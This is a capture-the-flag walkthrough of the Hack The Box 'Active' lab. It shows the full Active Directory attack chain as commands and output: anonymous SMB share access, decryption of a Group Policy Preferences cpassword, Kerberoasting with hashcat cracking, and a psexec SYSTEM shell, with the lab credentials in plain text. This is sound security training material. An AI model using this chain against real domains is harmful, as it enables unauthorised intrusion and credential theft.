Target: 10.10.10.100

## Enumeration:

nmap
```
$ sudo nmap -sC -sV 10.10.10.100

Nmap scan report for 10.10.10.100
Host is up (0.032s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-14 05:26:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

editing /etc/hosts
```
$ sudo vim /etc/hosts

10.10.10.100    active.htb
```

smbclient
```
$ smbclient -L //10.10.10.100

Enter WORKGROUP\kali's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

connecting to /Replication
```
$ smbclient //10.10.10.100/Replication

smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018
```

downloading suspicous file/s (policies)
```
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018
  Policies                            D        0  Sat Jul 21 06:37:44 2018
  scripts                             D        0  Wed Jul 18 14:48:57 2018

smb: \active.htb\> recurse ON

smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018
  Policies                            D        0  Sat Jul 21 06:37:44 2018
  scripts                             D        0  Wed Jul 18 14:48:57 2018

\active.htb\DfsrPrivate
  .                                 DHS        0  Sat Jul 21 06:37:44 2018
  ..                                DHS        0  Sat Jul 21 06:37:44 2018
  ConflictAndDeleted                  D        0  Wed Jul 18 14:51:30 2018
  Deleted                             D        0  Wed Jul 18 14:51:30 2018
  Installing                          D        0  Wed Jul 18 14:51:30 2018

\active.htb\Policies
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 06:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 06:37:44 2018

\active.htb\scripts
  .                                   D        0  Wed Jul 18 14:48:57 2018
  ..                                  D        0  Wed Jul 18 14:48:57 2018

\active.htb\DfsrPrivate\ConflictAndDeleted
  .                                   D        0  Wed Jul 18 14:51:30 2018
  ..                                  D        0  Wed Jul 18 14:51:30 2018

\active.htb\DfsrPrivate\Deleted
  .                                   D        0  Wed Jul 18 14:51:30 2018
  ..                                  D        0  Wed Jul 18 14:51:30 2018

\active.htb\DfsrPrivate\Installing
  .                                   D        0  Wed Jul 18 14:51:30 2018
  ..                                  D        0  Wed Jul 18 14:51:30 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018
  Group Policy                        D        0  Sat Jul 21 06:37:44 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       22  Wed Jul 18 14:49:12 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPE.INI                             A      119  Wed Jul 18 16:46:06 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Microsoft                           D        0  Sat Jul 21 06:37:44 2018
  Preferences                         D        0  Sat Jul 21 06:37:44 2018
  Registry.pol                        A     2788  Wed Jul 18 14:53:45 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Wed Jul 18 14:49:12 2018
  ..                                  D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Microsoft                           D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Wed Jul 18 14:49:12 2018
  ..                                  D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Windows NT                          D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups                              D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Windows NT                          D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  SecEdit                             D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  SecEdit                             D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GptTmpl.inf                         A     1098  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GptTmpl.inf                         A     3722  Wed Jul 18 14:49:12 2018

                10459647 blocks of size 4096. 5735113 blocks available

smb: \active.htb\> get Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
```

reading Groups.xml
```
$ cat Policies\\\{31B2F340-016D-11D2-945F-00C04FB984F9\}\\MACHINE\\Preferences\\Groups\\Groups.xml 

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

### Findings:Looking for attack vectors

Decrypt cpassword and login using the active.htb\SVC_TGS account.


## Foothold:

decrypting cpassword
```
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

Loot:

`SVC_TGS:GPPstillStandingStrong2k18`

enumerating SMB with found credentials
```
$ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -d workgroup -H 10.10.10.100

[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

/user SVC_TGS can access Users directory

```
$ smbclient //10.10.10.100/Users -U SVC_TGS

smb: \> get SVC_TGS\Desktop\user.txt 
getting file \SVC_TGS\Desktop\user.txt of size 34 as SVC_TGS\Desktop\user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

$ cat SVC_TGS\\Desktop\\user.txt                                                                  
<redacted>
```


## Priv Escalations:

kerberoasting with GetUserSPN
```
$ GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 -request

Impacket v0.9.24.dev1+20210611.72516.1a5ed9dc - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783             


$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2bfebfee946901f09f565295017819c7$3048561358ca39f35299ec55f035e644c0a815dedf197543c0ebebdd53fa45fda243d471a35975e3521ff8f1d499be66e2e036f8a7102b5a1f87662f452b295a3d298fd26b2f66ae7143f7f380766c91f0db2c0de3fa4a7d2d74030280a2de3c338f3e897567001db995089aec5cb0113153871aaba3f1a429e6331890dab4b1cb3f83bdec5eea88a1bc7723143dc88859656083dedc7cc2a64682f177d007ba6bb5bf5abda026c9f593c2083ed927b0d0822ce8a5152bdba2e9b16e472d63e7b845469b689391cce92609738850269cf80e0382842ce4ad0d89343ab71652b3fe266ae8d99e10f1b0e04a2fdcec6b83d75830837a14c1c08397d857e5c57adc44355efdd65b67b46ec49444c4180713f065e9141423f350dc06e6f14e6d671d2e098dab5989ea98bdee03a1b8f1e1a51b31070754e37d0e37cb6656ef644bffb9c5d51d3fabc818795652371e69ced1c921ee21a4b929f5b27604054f1133fd609d7ca989fefb6d52076e3606ec48927dbec918028bd43d76b054c23a4e08376d023131983ad7e917b191d6f93e7c466d0b054671ef7aba252b31ddafec69eab8e45494f8a24fd843742961a4a45a91efa6a6b47bb3a76916b6ae92e3092b260150b31e98547d78b260059469db59270b8414a501ef10315b67f68853b0c374178b13bbb85f8d1d5e5e3dfc0e19c0d87e028190313669bfa2df6b60bf551242f4b889fe16889474d12c2ac4848fc34c37f68efa5fb57d7bfeb7066fae681768533181fc093598e6ee8070c07e9fb026195543889e7d0a74a527710b8ef25ca4acaffd92f551c7c6f2711314618e9cf54e01e077900f4764eb662537069069e5019ac4ac59e24d4a4e68b1cbe969d4147f61b8e48b4c3e54dc2c7afea000b7d795f8dbf5ac04b6608caa11493954100687e58c708ec97b1825f4896a2b3dbb4510df0e1616dfcf8d5e1c4b31c20e3d1ab2363b20266d5984f9f22188fdb4dcfdb270d5af72ef2fb023a76567e7c7ba4f89fa03575e62ddeb699da3a6fa86c2c1f778ad9d3409ec0fdd0e22936db0bcfb43f14798efb126a2a3637723fb71aea2dfb62abab8f5b7375a67c6e49a97ee7ee32840520944d431366359513186424c67bbbe1e3f2b6a8f3e58e83b63779ac742d38f41c07cb2cdf3d1d1f1c798583fda307fb00a1432f0a5f47aa8e8ddb3fb5b552fe8f4e4fd63173170ae497aa15246bdd8eeef7956c12a23f1e902d6f1491ff3c8b776f5638bc134
```

cracking hash
```
$ hashcat -m 13100 -o crack.txt nhash.txt /usr/share/wordlists/rockyou.txt --force

$ cat crack.txt

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2bfebfee946901f09f565295017819c7$3048561358ca39f35299ec55f035e644c0a815dedf197543c0ebebdd53fa45fda243d471a35975e3521ff8f1d499be66e2e036f8a7102b5a1f87662f452b295a3d298fd26b2f66ae7143f7f380766c91f0db2c0de3fa4a7d2d74030280a2de3c338f3e897567001db995089aec5cb0113153871aaba3f1a429e6331890dab4b1cb3f83bdec5eea88a1bc7723143dc88859656083dedc7cc2a64682f177d007ba6bb5bf5abda026c9f593c2083ed927b0d0822ce8a5152bdba2e9b16e472d63e7b845469b689391cce92609738850269cf80e0382842ce4ad0d89343ab71652b3fe266ae8d99e10f1b0e04a2fdcec6b83d75830837a14c1c08397d857e5c57adc44355efdd65b67b46ec49444c4180713f065e9141423f350dc06e6f14e6d671d2e098dab5989ea98bdee03a1b8f1e1a51b31070754e37d0e37cb6656ef644bffb9c5d51d3fabc818795652371e69ced1c921ee21a4b929f5b27604054f1133fd609d7ca989fefb6d52076e3606ec48927dbec918028bd43d76b054c23a4e08376d023131983ad7e917b191d6f93e7c466d0b054671ef7aba252b31ddafec69eab8e45494f8a24fd843742961a4a45a91efa6a6b47bb3a76916b6ae92e3092b260150b31e98547d78b260059469db59270b8414a501ef10315b67f68853b0c374178b13bbb85f8d1d5e5e3dfc0e19c0d87e028190313669bfa2df6b60bf551242f4b889fe16889474d12c2ac4848fc34c37f68efa5fb57d7bfeb7066fae681768533181fc093598e6ee8070c07e9fb026195543889e7d0a74a527710b8ef25ca4acaffd92f551c7c6f2711314618e9cf54e01e077900f4764eb662537069069e5019ac4ac59e24d4a4e68b1cbe969d4147f61b8e48b4c3e54dc2c7afea000b7d795f8dbf5ac04b6608caa11493954100687e58c708ec97b1825f4896a2b3dbb4510df0e1616dfcf8d5e1c4b31c20e3d1ab2363b20266d5984f9f22188fdb4dcfdb270d5af72ef2fb023a76567e7c7ba4f89fa03575e62ddeb699da3a6fa86c2c1f778ad9d3409ec0fdd0e22936db0bcfb43f14798efb126a2a3637723fb71aea2dfb62abab8f5b7375a67c6e49a97ee7ee32840520944d431366359513186424c67bbbe1e3f2b6a8f3e58e83b63779ac742d38f41c07cb2cdf3d1d1f1c798583fda307fb00a1432f0a5f47aa8e8ddb3fb5b552fe8f4e4fd63173170ae497aa15246bdd8eeef7956c12a23f1e902d6f1491ff3c8b776f5638bc134:Ticketmaster1968
```

Loot:

`Administrator:Ticketmaster1968`


```
$ psexec.py active/Administrator@10.10.10.100 

Impacket v0.9.24.dev1+20210611.72516.1a5ed9dc - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file QnwhZkyn.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service JPHM on 10.10.10.100.....
[*] Starting service JPHM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami

nt authority\system
```

```
C:\Windows\system32>cd C:\Users\Administrator\Desktop
 
C:\Users\Administrator\Desktop>type root.txt

<redacted>
```